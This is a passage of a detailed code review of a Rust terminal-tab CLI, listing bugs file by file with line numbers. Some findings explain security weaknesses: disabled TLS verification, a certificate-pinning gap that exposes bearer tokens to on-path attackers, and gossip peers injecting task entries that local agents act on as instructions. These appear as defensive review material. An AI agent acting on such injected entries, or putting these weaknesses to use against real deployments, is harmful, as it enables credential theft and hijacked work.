flags.rs:58 + agent_probe.rs:348-353 a corrupt or hand-edited flags.json silently reads as EMPTY (read_flags swallows the parse error), so `status` reports every flag as 'default' with no hint the file is broken, and the very next `flags <name> on` writes the map back from that empty base — silently destroying every other persisted override; the subcommand's own set path is the data-loss trigger; flags.rs:58 + agent_probe.rs:395-415 the write is a plain read-modify-write with no lock and no temp-file+rename: two concurrent `flags` invocations lose one edit, and a crash or full disk mid-write leaves truncated JSON which then reads as empty per the finding above — the failure is self-reinforcing; flags.rs:41-48+73-90 a persisted key that no longer matches any INSTRUMENTATION_FLAGS entry (a renamed or removed flag) is invisible to `status` (which iterates the static table, not the file) AND unremovable by `set` (which requires flag_env_var to resolve the name), so the orphan sits there forever — and because set_persisted_flag only deletes flags.json when the map becomes empty, one orphan permanently blocks that cleanup path; flags.rs:29 the status arm is `(None | Some(\"status\"|\"show\"|\"list\"), _)` — the second element is a wildcard, so `flags list off` or `flags status on` prints the listing and exits 0 instead of erroring: a mistyped subcommand carrying a value is a silent no-op that reports success; flags.rs:28 only args[0] and args[1] are ever examined, so `flags probe on off` and `flags probe on --please` succeed with the trailing arguments discarded — there is no arity check anywhere; flags.rs:28-38 there is no -h/--help arm even though the module carries a full usage block at :15-20 that is never printed: `flags --help` falls into the (Some(name), None) arm and prints 'usage: flags --help <on|off|default>', which is both wrong and exits 2; flags.rs:77-88 an env var that is SET but unparseable (TAB_ATELIER_AGENT_PROBE=2, =yes\\ please) is treated as absent and reported as 'off (default)' — on the one subcommand whose stated purpose (:75) is explaining the effective value and its source, a misconfigured unit file is indistinguishable from an unset one, with no warning; flags.rs:61-62+73-74 two different staleness contracts are in play and neither is shown: `set` prints 'applies on next launch', but agent_probe::flag_enabled caches the persisted map for 30 s, so a running daemon can pick the change up mid-run — while `status` reads the file directly and immediately reports the new value, so the CLI shows a state the daemon is not yet in and promises a delay that does not match the code; flags.rs:10-12+27 state_base() resolves from the invoking process's user, so running `flags probe on` as root (the natural first attempt) writes root's state dir, prints success, and the daemon under its own user never sees it — nothing detects or warns that the file just written is not the one the daemon reads, and `status` then confirms the wrong file back to the operator

### `src/cli/gossip.rs`

gossip.rs:88-91 the PULL path merges however many entries the peer returns with no cap, while the inbound POST route caps a batch at MAX_MERGE=5000 with the comment "an oversized push is either a bug or an attempt to fill the disk" (api/blackboard_route.rs:20-22,52-55) — the documented defence exists in one direction only, so a hostile or buggy peer fills OUR disk through the pull and every later round re-uploads it to every other configured remote; gossip.rs:73-91+113-117 nothing about an incoming Note is validated: id, origin, kind (announce/bid/award/done) and task all come straight off the wire into merge_into_blackboard (cli/team.rs:467-490), so a peer can inject announce entries that local agents will take and act on as instructions, or done/award entries that retire work the local fleet has not finished; because the merge is a grow-only union keyed by id (team.rs:596-604) and ids are a content hash (append_entry :500-505), an entry whose id we already hold is dropped FOREVER — a peer that can predict an id pre-empts and permanently censors that entry; gossip.rs:84-87 the origin string is peer-supplied and handed to federation::remember, which overwrites the directory mapping unconditionally, last writer wins (federation.rs:78-95) — any configured peer can claim to be another host name and from then on endpoint_for routes that hosts task traffic (notably done reports) to the impostor; gossip.rs:80 a pull body that is not valid JSON is swallowed by unwrap_or(Value::Null), giving entries=[] with round.error still None, so the round prints as a successful "pulled 0 pushed N" — exactly the silent convergence failure this modules own test at :217-225 says must never happen; gossip.rs:73-75+113-117 the pull ignores the since cursor and the push sends read_blackboard() in full, although the server implements GET /blackboard?since=N and returns next (api/blackboard_route.rs:29-39) — so each round transfers the entire grow-only log in both directions, cost grows without bound, and since share_link::agent() sets a 3s timeout_GLOBAL that covers body upload (share_link.rs:105-110), the exchange eventually exceeds it and gossip fails permanently with no partial progress and no smaller retry; gossip.rs:67-68+114-117 gossip authenticates with ep.token, the full SIDECAR credential (list tabs, type input, move files — lib.rs:1776-1783), even though it only needs the blackboard resource; the relay path was given its own narrow token for exactly this reason and the gossip path was not, so configuring a peer for anti-entropy hands it full tab control; gossip.rs:67 nothing requires ep.url to be https, so on an http endpoint that bearer token is sent in clear on every round; gossip.rs:137-140 sweep_all runs the peers strictly sequentially with two requests each, so on the daemon sweep thread n unreachable peers cost n*6s of wall clock before the round completes; gossip.rs:172-176 endpoints are selected by exact label OR id with no dedup, so a URL configured twice is gossiped with twice per round, and gossip.rs:119-126 reports pushed from the peers own self-declared merged field, printing 0 when the field is missing rather than flagging that the push result is unknown

### `src/cli/logging.rs`

cli/logging.rs:55-58 'log off' only deletes the persisted file, but resolve_log_filter (lib.rs:1035-1038) prefers TAB_ATELIER_LOG then RUST_LOG over it — so on any machine with RUST_LOG exported (i.e. most Rust dev boxes) 'GUI logging disabled' is printed while logging stays fully ON; neither the off nor the set path checks the env the way status() does; cli/logging.rs:74 same asymmetry on the enable side: it prints "GUI logging enabled: filter 'X'" unconditionally, but if either env var is set the GUI will use THAT filter, not X, so the confirmation names a value that will never take effect; cli/logging.rs:65-74 an empty or whitespace-only argument (tab-atelier log '' or log '   ') is not a preset, so it is persisted verbatim, lib.rs:1069 trims it to an empty file, and resolve_log_filter's .filter(|s| !s.is_empty()) at lib.rs:1040 then reads that as OFF — the command reports 'enabled' for an action that disables logging; cli/logging.rs:72 the filter is never validated before being persisted: env_logger's parse_filters (lib.rs:1022) silently skips directives it cannot parse, so a typo like 'tab_atelier=inof' is stored, reported as success, and enables nothing at the next launch — round-tripping through env_logger::filter::Builder::try_parse before writing is the cheap fix; cli/logging.rs:90-94 status() re-implements the precedence from lib.rs:1035-1038 with different primitives — var_os().is_some() here vs var().ok() there — so a non-UTF-8 TAB_ATELIER_LOG makes resolve_log_filter fall through to RUST_LOG/persisted while status confidently reports 'source: env TAB_ATELIER_LOG'; two copies of the same precedence rule that already disagree; cli/logging.rs:97 'GUI logging: ON' is aspirational — init_gui_file_logging (lib.rs:1017) silently returns when the log file cannot be opened and log_ring::install can lose the race with an already-installed logger, so status reports ON and prints a 'Log file:' path that may not exist and may never be written; cli/logging.rs:51+55 extra arguments after status/show/off are silently ignored (log off whatever succeeds), so a mistyped invocation looks like it did what was asked; lib.rs:1069 the persist is a bare std::fs::write with no temp+rename, so a crash mid-write leaves a truncated filter string that resolve_log_filter will happily hand to parse_filters; cli/logging.rs has no tests at all — the whole exit-code contract (0 vs 1) and the preset table are uncovered

### `src/cli/logs.rs`

logs.rs:47 + api.rs:1882 '--lines 0' is accepted and forwarded as ?lines=0; the server does query_lines.unwrap_or(200).min(CAPACITY) so tail(0) returns empty, and the client at 136-138 then prints '(no records yet — the ring fills as the daemon logs)' — a FULL ring reported as empty. The parser refuses a non-numeric count precisely so the user is never quietly given something other than what they asked for (test comment at 180-181), but 0 slips through that reasoning; logs.rs:105-112 only 403 is diagnosed. A 401 from a stale or mismatched api.token — plausible, since discover_endpoint picks from three candidate token files (share_link.rs:84-88) and explicitly exists to handle the case where they disagree — falls into the generic Err(e) arm and prints ureq's raw error, leaving the user with no hint that the token is the problem rather than the daemon; logs.rs:121-123 --json prints the response body with NO validation and returns 0, so a non-JSON body (a proxy's HTML error page, a truncated response) exits SUCCESS, while the human path one branch later at 125-131 would report 'logs: parse:' and exit 1 for the identical response — the same bytes get two different verdicts depending on a display flag; logs.rs:141+145 every field falls back silently: level/target/msg to "" and ts_ms to 0, so a malformed record renders as a plausible-looking '00:00:00.000       : ' line instead of anything marked bad, and a ts_ms that is actually SECONDS (a producer bug) divides down to a believable near-midnight time rather than an obvious one; logs.rs:70-75 format_stamp is UTC-only and '% 24' discards the date, but nothing in the output or in usage() (18-24) says UTC — a user in a non-UTC zone silently reads every stamp offset from their own clock, and on a long-running daemon there is no way to tell which day a record is from or that the ring straddles midnight; logs.rs:202-221 the only end-to-end test asserts exit codes and never inspects a single rendered line, so the whole extraction+render path at 140-151 (including both unwrap_or fallbacks above) is uncovered — run() could print nothing at all and the test would still pass; format_line is exercised only in isolation at 195-198; logs.rs:106 the 403 message hard-codes the loopback explanation — correct for the one 403 this route can return today (api.rs:1878-1880), but it is an assumption baked into user-facing text, so any future 403 gate on /logs would produce a confidently wrong diagnosis; logs.rs:43-63 repeated flags silently last-wins ('--lines 5 --lines 10' yields 10) — the single input case this otherwise strict parser does not refuse

### `src/cli/remote.rs`

cli/remote.rs:239+261+393 every mutating verb calls save_preferences, which (lib.rs:3476-3483) is a bare fs::write with BOTH the serialise error and the write error dropped via let _ and no return value — so 'remote add' prints '✓ added endpoint' and exits 0 even when nothing reached disk, silently losing the peer master token the user just pasted; the same file already has write_atomic_with_rotation (used by save_state at lib.rs:3485-3490 and by save_preferences_at at :3507), so the one write that carries remote credentials is the only non-atomic, non-rotating, non-reporting one; cli/remote.rs:218-239 add/remove/re-pin do a whole-file read-modify-write through the TYPED Preferences struct, so any key the binary does not know about is silently dropped from preferences.json and any concurrent daemon or CLI write in between is lost — cli/style.rs:162-163 patches raw JSON specifically to avoid this and says so; the two modules edit the same file with opposite strategies; cli/remote.rs:288+20+89 'remote watch' is documented and advertised as following 'until Ctrl-C' but the deadline is now + 600s, after which the loop simply ends and returns 0 — a watcher silently stops after ten minutes and its exit code is indistinguishable from a clean interrupt; cli/remote.rs:291-294 the SHUTDOWN_REQUESTED check is dead code on this path: neither binary installs the ctrlc handler until AFTER dispatch (src/main.rs:88, bin/tab-atelier-headless.rs:88) and every remote verb runs inside dispatch, so the flag is never set, the '(interrupted)' branch is unreachable, and Ctrl-C simply kills the process on the default disposition; cli/remote.rs:339 &remote_id[..8.min(len)] byte-slices a server-supplied string and PANICS if byte 8 is not a UTF-8 char boundary — a peer returning a non-ASCII tab id crashes the watch loop; cli/remote.rs:185-191 --url is validated only for non-emptiness, so 'remote add --url "not a url"' is persisted happily and fails much later at connect time, which is precisely the failure mode the test comment at :473-475 claims this validation prevents; cli/remote.rs:136-177 five of the nine options (--cert-sha256, --cf-id, --cf-secret, --relay-token and the value forms generally) take args.get(i).cloned() with no missing-value check, and unlike label/url/token they have no non-empty guard afterwards — a trailing '--cf-secret' silently produces an endpoint with a Cloudflare client id and an empty secret that Access will reject at every later request; the test at :484-487 only covers the three flags that happen to be guarded; cli/remote.rs:202-216 an https endpoint added with --no-pin stores an empty fingerprint, which makes warn_if_cert_drifted (resolver.rs:87) return immediately — the endpoint is then never checked again and nothing ever says so; conversely --cert-sha256 with an http:// url stores a fingerprint on a plaintext endpoint where it can never be verified; cli/remote.rs:254-256 remove uses retain, so a preferences.json hand-edited to contain two endpoints with the same label deletes BOTH while reporting one removal; cli/remote.rs:108+119 the list header says 'cert sha256 (12)' while the value is truncated to 24; cli/remote.rs:443+503 the tests call run(list) against the DEVELOPER'S real preferences.json via platform::config_dir() with no tempdir override — the add/remove tests are safe only because every one of them bails before save_preferences, so the moment a validation is relaxed the suite starts writing to the developer's config

### `src/cli/remote/attach.rs`

attach.rs:151-155 the exit path HANGS: the stdin forwarder parks in a BLOCKING handle.read() (183) and only tests exit_flag at the top of its loop (180), so when the main loop breaks for any reason that is not the user pressing Ctrl-Q — remote tab closed (135-137), client thread disconnected (144-146), a stdout error (124-127) — setting the flag at 151 does nothing and the unconditional t.join() at 154 blocks until the user happens to press a key; '(detached, ...)' at 156 never prints until then. The guard is dropped first so the terminal is at least usable, but the command appears wedged after announcing '(remote tab closed)'; attach.rs:104 + main.rs:64/88 the SHUTDOWN_REQUESTED check is DEAD CODE — cli::dispatch::dispatch() runs and exits inside at main.rs:64, before the only ctrlc::set_handler in this binary at main.rs:88, so no signal handler is ever installed for a CLI subcommand and that flag is permanently false. The consequence is worse than the dead branch: raw mode is on (92) and RawModeGuard::drop (219-224) only runs on unwind, so a SIGTERM, a SIGHUP from a closing terminal window, or any kill leaves the user's terminal in RAW MODE with no echo and no line editing, recoverable only by blind-typing reset/stty sane. Ctrl-C is safe here (crossterm's raw mode clears ISIG, so it arrives as byte 0x03 and is forwarded as documented) — it is every other signal that is unhandled; attach.rs:189-198 the detach key is matched with chunk.contains(&0x11) — byte 0x11 ANYWHERE in a 256-byte read, with no escape-sequence or paste awareness — and everything after it in that chunk is silently DISCARDED (191 keeps only the bytes before, 198 breaks). A paste containing a 0x11/DC1 byte, or any terminal-generated sequence carrying one, therefore detaches mid-stream and drops the remainder of the buffer with no message; attach.rs:213 an unconditional 50 ms sleep runs after EVERY read, including a blocking read that just returned data — so typed input and pastes are throttled at ~256 bytes per 50 ms (a 4 KB paste gains ~800 ms of pure added latency on top of the ~250 ms floor the module doc already concedes at 16-18). The comment justifies it for platforms where stdin is non-blocking; on the platform where it blocks — the normal case — it is pure penalty and should be conditional on a zero-length read; attach.rs:80 &target.remote_id[..8.min(len)] byte-slices a string that came from the REMOTE peer's JSON: a tab id whose 7th character is multi-byte (6 ASCII bytes then a 3-byte codepoint spanning indices 6-8) makes index 8 a non-char boundary and PANICS the client at the 'Attached to' banner, before the raw-mode guard exists — peer-controlled input crashing the client that connects to it; chars().take(8) is the safe form; attach.rs:100/123/156 last_seen_len is assigned from every Output frame and then used only to decorate the farewell line — total_len is the one signal that could detect a SILENT gap (total_len advancing by more than bytes.len() without the replaced flag, i.e. output dropped between polls) and it is collected and thrown away, so missed output is undetectable; attach.rs:115-122 on replaced the code emits ESC[2J ESC[H, which clears the visible screen but NOT the local scrollback, and then writes the full re-emitted remote scrollback — so every CRC mismatch or alt-screen toggle appends another complete copy of the remote history to the user's local scrollback, which accumulates duplicates over a session; attach.rs:140-142 RemoteEvent::Error is printed and the loop continues unconditionally — a remote failing on every poll floods the raw-mode screen with warning lines at the poll cadence, interleaved with tab output, with no rate limit, no deduplication and no give-up threshold

### `src/cli/remote/files.rs`

cli/remote/files.rs:91+170 both put and get build the ureq agent with disable_verification(true), so the actual transfer — which carries the bearer token via crate::remote::authorized and the file bytes — runs over completely unauthenticated TLS; the TOFU pin is advisory only: warn_if_cert_drifted (resolver.rs:86-104) prints to stderr and returns, never fails the command, silently returns when cert_sha256 is empty or the host is momentarily unreachable, and it checks the fingerprint over its OWN separate connection (fetch_cert_fingerprint), so even a matching pin says nothing about the connection that then ships the token — any on-path attacker on the LAN gets both the credential and the file with at most a warning line the user can miss; cli/remote/files.rs:105-109 put treats ANY Ok response as success: read_json().unwrap_or_default() turns a non-JSON body into null, path falls back to '?', and it still prints '✓ uploaded N bytes → ?' and returns 0 — a captive portal or reverse proxy answering 200 with HTML is indistinguishable from a real upload; cli/remote/files.rs:202 get writes with std::fs::write, which truncates an existing local file with no prompt, no --force and no temp+rename — 'remote get host notes.md' silently destroys ./notes.md, and because the write happens unconditionally a 200-with-empty-body replaces the local file with 0 bytes and still reports '✓ downloaded 0 bytes'; cli/remote/files.rs:29-36+125-132 every option consumes the next argv element via args.get(i).cloned() with no check that it exists or that it is not itself a flag: a trailing '--tab' silently becomes None and falls back to the remote's ACTIVE tab (a different tab than the user named), a trailing '--remote-name' silently falls back to the local basename, and 'get ... -o --tab foo' happily uses '--tab' as the output filename — all of these should be exit 2, none are; cli/remote/files.rs:37 vs :133 the two commands disagree on what counts as an unknown flag (put rejects only '--*', get also rejects 2-char '-x'), so malformed flags leak into the positional list in different ways per subcommand; cli/remote/files.rs:20+86+166 timeout_global(30s) bounds the WHOLE request including body transfer, so any file large enough or link slow enough to exceed 30s fails with no resume and, for put, no way to know whether the server already committed the partial write; cli/remote/files.rs:61 put reads the entire file into memory with std::fs::read and no size cap before it has even resolved the tab, and :182 read_to_vec sets no explicit limit on what a misbehaving remote can stream back; cli/remote/files.rs:85-95 and :165-175 are an identical 11-line agent-construction block (and :27-44/:123-140 near-identical parse loops), so the TLS policy is written twice and can drift between the two commands; cli/remote/files.rs:216 resolve_tab_index spawns a full remote Client thread purely to map a name to an index and just drops it, leaving the thread's shutdown to Client's Drop; cli/remote/files.rs:206 the stdout flush is issued BEFORE the println! it is presumably meant to flush; no tests in this file at all

### `src/cli/remote/resolver.rs`

resolver.rs:86-104 warn_if_cert_drifted checks a fingerprint on a SEPARATE probe connection (fetch_cert_fingerprint opens its own TLS session) and then the caller connects again — classic pinning TOCTOU: an attacker can serve the genuine cert to the probe and a different one to the session that actually carries the data, and nothing re-checks; resolver.rs:90-94 a failed probe returns silently, so 'could not reach the endpoint' and 'fingerprint matches' are indistinguishable to the user — anything that makes the pre-flight fetch fail (a dropped packet, a slow host, an attacker refusing the probe) suppresses the entire warning; combined with the doc at :84-85 admitting the transport still runs with disable_verification, the pin gates nothing at all and is decorative; resolver.rs:87 the early return also means an endpoint with an EMPTY cert_sha256 is never warned about and never prompted to pin, so trust-on-first-use is never established — an https endpoint added without pinning stays unpinned forever with no signal; resolver.rs:16-20 endpoint() takes the FIRST match with no ambiguity check: two endpoints labelled 'prod' and 'PROD', or a label that equals another entry's id, silently resolve to whichever was stored first — and the wrong answer here means `put`/`get` sends files to the wrong host; this is the same ambiguity class that pick_tab explicitly refuses to guess at (:75-78), handled two opposite ways in one file; resolver.rs:19 the same predicate is case-INsensitive for label but case-SENSITIVE for id, so a pasted uppercase UUID silently fails to match the endpoint it names; resolver.rs:64 pick_tab has the identical asymmetry — `t.remote_id == arg` is exact-match, so an uppercased UUID falls through the id branch, then through the name branch, and reports 'no tab matched' while listing names that do not explain the failure; resolver.rs:75-78 the ambiguous-name error tells the user to 'disambiguate with #<index> or the UUID' but prints neither: it reports only a count, while the 0-match branch at :70-73 does list the candidates — the one error that requires extra data withholds it, so the suggested remedy cannot be followed without another command; resolver.rs:39 RemoteEvent::Output arriving before the first Tabs frame is dropped on the floor: for `attach`, any bytes the remote emits between connect and the tabs snapshot (a shell prompt, the tail of a running command) are lost and the session starts mid-stream with no indication; resolver.rs:31 `Instant::now() + timeout` is an unchecked Add that panics on overflow — a caller passing a large or computed Duration turns a timeout into a process abort, in a crate that otherwise forbids unwrap; resolver.rs:32-36 the deadline is also only approximate in the wrong direction: the guard is checked before a 200 ms blocking recv, so any timeout under 200 ms still blocks the full 200 ms; resolver.rs:56-63 the '#N' path resolves against remote_index, the very index the function's doc (:50-51) says callers must not depend on because it 'drifts across reconciles' — the drift window between fetching the snapshot and resolving is real, and a reconcile inside it silently selects a different tab than the user saw listed

### `src/cli/set_context.rs`

set_context.rs:75-92 the text is sent completely unsanitised — no length cap, no control-character strip — while the sibling set-meta path runs crate::sanitize_meta which explicitly filters control chars because "they would corrupt a header line or a log"; the server (api/tab_props.rs:128-130) only truncates to 2000 chars and trims, so an in-tab agent can store ESC sequences in a tab context that the human then renders by running tab-atelier tabs in their own terminal, and newlines break the one-line tooltip/listing contract the module doc describes; set_context.rs:98-111 the response body is discarded and any 2xx prints ✓ tab context set, but the server ANSWERS with the value it actually stored — a whitespace-only or over-2000-char string comes back as {"context":null} (a CLEAR) while the CLI still reports it as set, and the same blindness hides that the write is only QUEUED (pending_context_changes) rather than applied; set_context.rs:112-115 the error arm prints the bare ureq error, so a 404 tab-not-found from the API reaches the user as an opaque "http status: 404" with no hint that the --tab id was wrong; api/tab_props.rs:112-125 (reached only through this CLI) a body that fails to parse, or a context field that is not a string, is silently treated as a CLEAR instead of a 400 — a garbled request wipes the tab context rather than failing; set_context.rs:31+72-77 --clear silently beats supplied text: set-context "PR #3719" --clear clears and discards the argument with no warning; set_context.rs:51 the positional filter only rejects arguments starting with two dashes, so a single-dash argument is silently absorbed into the context text, and there is no -- end-of-options marker for text that legitimately starts with dashes; set_context.rs:32-38 --tab consumes whatever follows with no leading-dash check, so set-context --tab --clear takes "--clear" as the tab id and then fails at the API with a 404; set_context.rs:93 tab_id is interpolated into the URL path with no uuid validation and no percent-encoding, so a slash or query character in --tab reshapes the request path; set_context.rs:75 parts.join(" ") flattens the positionals, so shell quoting and multiple spaces are not preserved; set_context.rs:65-70 outside a tab the command exits 0 having printed nothing at all — deliberate for hooks, but it makes a real success and a silently-dropped write indistinguishable to any script that checks only the exit code; set_context.rs:94-97 the 2s global timeout turns a busy daemon into exit 1 even though the POST may have been accepted and queued

### `src/cli/set_font.rs`

set_font.rs:75+82 the doc claims load-modify-save "preserving the other settings", but crate::load_preferences (lib.rs:3460-3474) swallows every parse error with .ok()? and returns Preferences::default() — so running set-font against a preferences.json with one syntax error, or one field the current build cannot deserialize, silently loads DEFAULTS and then overwrites the file: every other setting is destroyed, including the plaintext remote_endpoint bearer tokens lib.rs:3511 documents as living there, with no backup and a cheerful ✓ printed; set_font.rs:82 uses save_preferences (lib.rs:3476-3483: plain fs::write, no tmp+rename, no .bak rotation, no 0600) although save_preferences_at (lib.rs:3507-3522) exists and does all three for exactly this file — so a crash or ENOSPC mid-write truncates preferences.json (producing the corruption the previous finding then acts on), and when no user file exists yet the create happens at umask default 0644 while load_preferences has just fallen back to SYSTEM_PREFERENCES_PATH, meaning set-font can copy the system-wide prefs and any tokens in them into a NEW world-readable per-user file; set_font.rs:75 that same system-file fallback means the first set-font on a machine with system prefs silently forks a full private copy — later admin-side changes stop reaching that user, with nothing said; set_font.rs:82-90 save_preferences returns unit and swallows its own IO error, so on a read-only or full home the command prints "✓ font set" and exits 0 having written nothing — the CLI has no way to report the one failure that matters; set_font.rs:36 the range check (0, 200] admits absurd small values: --size 0.0001 is accepted and lands in the GUI as the cell metric, where a near-zero cell width makes the column count blow up (width/cell) — the lower bound needs to be a real minimum, not just non-zero; set_font.rs:25-26 --font takes the next argument whatever it is, with no leading-dash check, so set-font --font --size 16 silently sets the family to the literal "--size" and then errors on 16 as unexpected; set_font.rs:58 conversely a positional family is only accepted when it does not start with a dash and there is no -- end-of-options marker, so a family beginning with a dash cannot be set at all; set_font.rs:84-88 the confirmation reads the MERGED prefs, so set-font --size 18 prints family=<previously stored value> as though the family had just been set; set_font.rs:74-82 nothing validates that the family exists — the stated purpose is fixing a badly-spaced font, yet a typo writes happily and the user only discovers it after the relog the tool tells them to do

### `src/cli/set_meta.rs`

set_meta.rs:107-120 the ✓ is printed for ANY non-error response but the API only QUEUES the change (api/meta.rs:62-64 responds 200 "queued"), and the deferred apply in lib.rs:1509-1512 silently drops it when the map is at META_MAX_KEYS and the key is new — the enqueue-time full check at api/meta.rs:55 races against other producers, so set-meta can report success for a label that never lands; set_meta.rs:121-124 the error arm prints the bare ureq error, so a 400 from the API loses the server body — "meta is full (N keys)" or the exact validation reason never reaches the user, they get only "http status: 400"; cli/brain.rs:119 does this right by reading .status() and the body; set_meta.rs:74+100 sanitize_meta is called for validation and its normalised VALUE is thrown away (Ok((k, _))), then the RAW joined value is sent — the daemon re-sanitises, so a value containing control chars or surrounding whitespace is stored altered while the CLI prints ✓ for what the user typed; set_meta.rs:30+74 --clear silently beats a value: set-meta role reviewer --clear clears the key and the value argument is discarded with no warning, and the same combination makes the local validation run against the dummy "x" so the real value is never checked; set_meta.rs:108 tab_override goes into the URL path unvalidated and unencoded — no uuid parse, no percent-encoding — so --tab with a slash or a query char reshapes the request path and produces a confusing 404 instead of "not a tab id"; set_meta.rs:55-59 there is no -- end-of-options marker and any positional starting with two dashes is rejected as an unknown argument, so a value like --draft cannot be set at all; set_meta.rs:68 rest.join(" ") flattens multiple positionals into a single space-separated string, so shell quoting is not preserved: set-meta k a "" b stores "a  b"; set_meta.rs:84-89 outside a tab the command returns 0 with NO output at all — success and silently-dropped are indistinguishable to a calling script, which matters more here than for set-status because meta is the orchestration layer state; set_meta.rs:103-106 a 2s global timeout means a busy daemon yields exit 1 while the POST may well have been queued — the failure is not safely retryable-as-idempotent for a caller that then falls back to a different value

### `src/cli/set_status.rs`

set_status.rs:38-49 value-taking flags (--label/--session/--kind) silently accept a MISSING value (args.get(i).cloned()=None, no error) and happily swallow the next flag as their value: `set-status idle --label --plan` sets label="--plan" and drops --plan, exit 0; set_status.rs:17-26 missing API_URL/API_TOKEN exits 0 even when _TAB_ID IS set, so a broken in-tab hook config is indistinguishable from running outside a tab — the doc comment only justifies the no-op for the outside case; set_status.rs:93 tab_id from env is interpolated into the URL path unencoded, and the server (api/status.rs:19) slices by prefix/suffix so any '/' or '?' in _TAB_ID retargets the request path; set_status.rs:74-90 vs api/status.rs:39-62 — state 'idle' takes an early-return branch that DISCARDS sessionId/agentKind/planMode/daemon, yet the CLI accepts and sends them and gets 200 {cleared:true}; a Stop-hook doing `idle --session <uuid> --kind claude` never registers the session and gets no warning; set_status.rs:53 --daemon is one-way — daemon is only inserted when true and there is no --no-daemon, so a tab can never be un-marked daemon (asymmetric with --plan/--no-plan which does send false); set_status.rs:56 positional guard is !starts_with("--") so a single-dash typo like -idle is taken as the state and forwarded, turning a usage error into an opaque ureq 400 (exit 1); no client-side validation of state against idle|thinking|waiting|error despite the usage line listing them; env-triple + 15-line ureq POST boilerplate is copy-pasted verbatim in set_meta.rs:104 and set_context.rs:95 — one shared helper would keep timeout/auth/error-exit behaviour from drifting apart

### `src/cli/share_link.rs`

cli/share_link.rs:198-200 share-link embeds the MASTER api token in the printed URL and --ro merely appends a query parameter the recipient can delete — the link grants full API access (create/close tabs, send input to any tab) regardless of --ro, so the flag advertised in the usage line at :168 implies a read-only property that does not exist; the stderr note at :200 admits it but stdout is what gets pasted into chat; cli/share_link.rs:196-199 the share URL is built from local_ip() + http_port(), completely ignoring share_url_base — the preference that the settings verb in this same file exists to set and print (:1604, :1757, :1787) — so configuring a public share base has no effect on the command whose whole job is producing shareable URLs; cli/share_link.rs:219+236-241 add() treats a FAILED pre-count as zero tabs (fetch_tabs.map_or(0,...)), so on a transient GET /tabs error the 'tabs.len() > before' test passes immediately against the pre-existing tab list, new_idx becomes the LAST EXISTING tab, and the optional name is then POSTed to /tabs/<idx>/rename — renaming an unrelated tab the user never touched and reporting 'created tab N'; the same last()-is-newest assumption breaks if any other client creates a tab during the poll; cli/share_link.rs:375-380 and :445-450 the read_json fallback is unwrap_or(on)/unwrap_or(disabled), i.e. when the server's reply cannot be parsed the code ASSUMES the requested state took effect and prints success — the comment immediately above at :371-374 says this block was added specifically to stop hiding toggles that did not take effect, and the fallback re-hides exactly that case; cli/share_link.rs:1710-1732+1848-1852 settings/ports silently replaces an unparsable preferences.json with json!({}) and then writes it back, destroying api_addr, TLS cert/key/client-CA paths and every other key — after which the daemon rebinds to defaults on next start; to_string_pretty(..).unwrap_or_default() would write an EMPTY file and still print 'updated'; the write is a bare fs::write with no temp+rename; write_global_bg at :1947-1979 is the same code with the same three defects; cli/share_link.rs:1596-1602 --api-addr and --api-tls-addr swallow a missing value silently (args.get(i).cloned() leaves None), so 'settings --api-addr' with a forgotten argument falls through to the read-only branch at :1734-1796 and exits 0 having changed nothing; and neither value is validated, so an unparsable bind address is written verbatim and the daemon simply fails to bind on next start, locking the operator out of the API that would let them fix it; cli/share_link.rs:1648-1665+1689-1690 the help states TLS cert and key must be set together, but nothing enforces it — 'settings --tls-cert X' alone writes a half-configuration that silently degrades to the self-signed cert with no warning; cli/share_link.rs:1573-1578 the # Panics doc claims the function panics when the JSON root is not an object, but :1798-1801 returns a clean error — a stale doc promising a panic that no longer exists; cli/share_link.rs:150-156 http_port takes the LAST colon in the URL, so a portless https endpoint yields '//host/' and falls back to 7890, silently producing share links pointing at the wrong port for any TLS or reverse-proxied deployment; cli/share_link.rs:107 the 3s global timeout applies to output() at :1541 which pulls the entire scrollback, and add()'s comment at :230-231 claims a '~2 s' bound while the loop is 20 iterations of sleep(100ms) PLUS a 3s-bounded fetch each, i.e. up to ~62s; cli/share_link.rs:436+497 only 412 and 501 are decoded from ureq's error, every other status prints as a bare status code with the response body discarded, so a 400 carrying the server's explanation surfaces as an opaque number across every verb in the file

### `src/cli/style.rs`

cli/style.rs:216-219+242 set_folder rebuilds the WHOLE preferences document from a .ok() read: if preferences.json exists but fails to parse (or the read fails transiently), doc silently becomes json!({}) and the fs::write at :242 then replaces the entire file with just folder_styles — every unrelated preference (theme, opacity, API bind, tokens) is destroyed, and the command still prints 'updated …' and exits 0; this is the exact inverse of the design goal stated at :162-163 and asserted at :384-385, and the test at :430-433 stops one line short of it (it writes garbage then only calls load_rules/list_rules, never set_folder); cli/style.rs:242 the write is a bare fs::write with no temp+rename, so a crash or the daemon's mtime-triggered re-read (:12-14) can see a truncated file — which on the next invocation is precisely the malformed input that triggers the wipe above; and to_string_pretty(...).unwrap_or_default() means a serialisation failure writes an EMPTY preferences.json and still reports success; cli/style.rs:200-242 the read-modify-write has no locking against the daemon, which also persists preferences.json, so a daemon write landing between :216 and :242 is silently lost; cli/style.rs:114-120 vs :209 sanitize_badge returns the cleaned String (lib.rs:1542-1550 trims and strips control chars) but the Err-only check discards it and :209 stores the RAW argument — so a badge like '  TAG\n' passes validation and lands in preferences.json with its control character intact, defeating the sanitiser it just called; the per-tab route escapes this only because the server re-sanitises; cli/style.rs:146 vs :149 run() checks list FIRST, so 'style --folder /x --color #123456 --list' prints the rule table, never applies the colour, and exits 0 — a silent no-op the parser at :121-124 could have rejected the way it rejects --folder with --tab; cli/style.rs:201-202 --clear on a folder removes the whole rule and silently ignores any --color/--badge passed alongside it, while set_tab at :270-271 makes --clear OVERRIDE those flags — two different meanings for the same flag depending on target, and both throw away a value the user typed; cli/style.rs:41 canonicalize resolves symlinks for an existing directory, so a rule added as ~/proj is stored as its real path while tabs whose cwd was recorded through the symlink never match it (folder_style_for at lib.rs:1559 matches by ancestor prefix on the string); a rule for a not-yet-existing directory is stored verbatim, so the same folder is stored in two incompatible forms depending on whether it existed when the rule was made; cli/style.rs:43 the absolute-path test is s.starts_with('/'), which no canonicalised Windows path satisfies — style --folder is unusable on Windows even though the crate ships a win_service path; cli/style.rs:33-35 only '~/' is expanded, so a bare '~' falls through and fails with the misleading 'expected an absolute path'; :42 to_string_lossy silently mangles a non-UTF-8 directory into a rule that can never match; cli/style.rs:288-299 the two POSTs are not transactional: if bg-color succeeds and badge fails, the colour has already been applied but the command reports only the badge error and exits 1; cli/style.rs:158 returns 2 with no message at all; cli/style.rs:172-186 --list shows folder rules only, never the per-tab overrides that :27 says win over them, so the listing does not describe what is actually applied; set_tab 